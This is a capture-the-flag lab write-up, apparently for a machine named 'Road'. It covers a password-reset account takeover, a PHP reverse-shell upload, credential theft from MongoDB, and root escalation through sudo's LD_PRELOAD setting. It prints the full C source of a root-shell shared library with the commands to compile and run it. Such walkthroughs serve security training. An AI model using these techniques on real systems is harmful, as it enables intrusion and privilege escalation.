{% from "macros.html" import console, image, text, code, list, link, header, script, imageModal %}

{{imageModal()}}

{{header("Enumeration", "enumeration")}}

{{text("We begin by scanning all the ports.")}}

{{console("nmap -T5 -p- 10.10.232.145", "Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-14 19:02 CET
Warning: 10.10.232.145 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.232.145
Host is up (0.075s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 275.41 seconds")}}

{{text("Let's visit the web page.")}}

{{image("../../static/writeups/road/images/000001.jpg")}}

{{text("By clicking on 'Merchant Central' we get brought to a log in page.")}}

{{image("../../static/writeups/road/images/000002.jpg")}}

{{text("I tried a couple of SQL Injection payloads, but they didn't work. Maybe we could try registering a new user.")}}

{{text("We can register pretty easily with pretty much any information. We login as a new user.")}}

{{image("../../static/writeups/road/images/000003.jpg")}}

{{header("Shell as www-data", "shell-as-www-data")}}

{{text("Even that it look robust, luckly for us there are only a couple of real functionalities.")}}

{{text("All we can pretty much do is reset our password and edit our profile.")}}

{{text("What was surprising to me, only an admin is able to upload a profile picture. Rather odd.")}}

{{image("../../static/writeups/road/images/000004.jpg")}}

{{text("I continued with reseting my credentials. After catching a request with Burp, I noticed something interesting.")}}

{{image("../../static/writeups/road/images/000005.jpg")}}

{{text("On the site, the mail field is greyed out so that you can't edit it, but it's editable here. Looking at the previous picture we also find out the e-mail address of the administrator.")}}

{{text("Let's send a request with administrator's e-mail and our own password.")}}

{{text("After sending the request, I got a response with code 200. We should try to log in with the password we provided.")}}

{{image("../../static/writeups/road/images/000006.jpg")}}

{{text("It worked, and now we were the admin. Let us go back to uploading a profile picture.")}}

{{text("We go to <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>revshells.com</code> and get ourselves a PHP PentestMonkey shell and save it into a file.")}}

{{text("Now we upload our <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>.php</code> file as our profile picture and pray it works.")}}

{{text("We get a response that it was uploaded successfully. But where to?")}}

{{text("Looking at the source code, we find a commented out directory that probably has our shell.")}}

{{image("../../static/writeups/road/images/000007.jpg")}}

{{text("We set up a listener and go to our file. We should get a connection.")}}

{{image("../../static/writeups/road/images/000008.jpg")}}

{{header("Shell as webdeveloper", "shell-as-webdeveloper")}}

{{text("While enumerating the machine I tried running <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>netstat -tulnp</code>, but it wasn't installed on the system. This was the first time I encountered something like this, so I tried alternative commands.")}}

{{console("ss -atur", "Netid State    Recv-Q  Send-Q                                                    
udp   UNCONN   0       0                                           localhost%lo:domain
udp   UNCONN   0       0        ip-10-10-77-159.eu-west-1.compute.internal%eth0:bootpc
tcp   LISTEN   0       70                                             localhost:33060
tcp   LISTEN   0       511                                            localhost:9000
tcp   LISTEN   0       4096                                           localhost:27017
tcp   LISTEN   0       151                                            localhost:mysql
tcp   LISTEN   0       4096                                        localhost%lo:domain
tcp   LISTEN   0       128                                              0.0.0.0:ssh
tcp   ESTAB    0       10            ip-10-10-77-159.eu-west-1.compute.internal:38066
tcp   SYN-SENT 0       1             ip-10-10-77-159.eu-west-1.compute.internal:45242
tcp   SYN-SENT 0       1             ip-10-10-77-159.eu-west-1.compute.internal:47632
tcp   SYN-SENT 0       1             ip-10-10-77-159.eu-west-1.compute.internal:47634
tcp   SYN-SENT 0       1             ip-10-10-77-159.eu-west-1.compute.internal:51540
tcp   SYN-SENT 0       1             ip-10-10-77-159.eu-west-1.compute.internal:51544
tcp   SYN-SENT 0       1             ip-10-10-77-159.eu-west-1.compute.internal:51538
tcp   SYN-SENT 0       1             ip-10-10-77-159.eu-west-1.compute.internal:56800
tcp   SYN-SENT 0       1             ip-10-10-77-159.eu-west-1.compute.internal:51542
tcp   LISTEN   0       511                                                    *:http
tcp   LISTEN   0       128                                                 [::]:ssh
tcp   ESTAB    0       0             ip-10-10-77-159.eu-west-1.compute.internal:http")}}

{{text("There are a couple of ports listening, but the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>27017</code> was interesting. It corresponds to a <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>MongoDB</code> service.")}}

{{text("We can try to connect to it.")}}

{{console("mongo 127.0.0.1", "MongoDB shell version v4.4.6
connecting to: mongodb://127.0.0.1:27017/test?compressors=disabled&gssapiServiceName=mongodb
Implicit session: session { 'id' : UUID('ef7eea47-d872-4c70-bf0b-ac15d3a0db85') }
MongoDB server version: 4.4.6
...")}}

{{text("It worked and now we can look for any sort of credentials on the server.")}}

{{text("We check for databases, the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>backup</code> one looked the most interesting so I used it. There was an <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>user</code> table which might contain credentials.")}}

{{image("../../static/writeups/road/images/000009.jpg")}}

{{text("We were right, and now we can log in as the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>webdeveloper</code> user.")}}

{{header("Shell as root", "shell-as-root")}}

{{text("Because we had our current user password, I checked his sudo privilages.")}}

{{console("sudo -l", "Matching Defaults entries for webdeveloper on sky:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    env_keep+=LD_PRELOAD

User webdeveloper may run the following commands on sky:
    (ALL : ALL) NOPASSWD: /usr/bin/sky_backup_utility")}}

{{text("We can run <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/usr/bin/sky_backuup_utility</code> as root, but that is not the most interesting.")}}

{{text("The <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>env_keep+=LD_PRELOAD</code> line is.")}}

{{text("It is a function that allows us to make any program use shared libraries. Meaning that if we create a shared library that creates a shell as root and it runs with <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>sky_backup_utility</code> while it's running as sudo, we should become root.")}}

{{text("So let's begin.")}}

{{text("We create a file that will grant us a root shell.")}}

{{console("cat root.c", "#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
            unsetenv('LD_PRELOAD');
                setgid(0);
                    setuid(0);
                        system('/bin/bash');
}")}}

{{text("Then we compile it.")}}

{{console("gcc -fPIC -shared -o root.so root.c -nostartfiles")}}

{{text("Now we just need to run our program while specifying our newly compiled file.")}}

{{console("sudo LD_PRELOAD=/home/webdeveloper/root.so sky_backup_utility")}}

{{text("We then should become root.")}}

{{image("../../static/writeups/road/images/000010.jpg")}}

{{script()}}







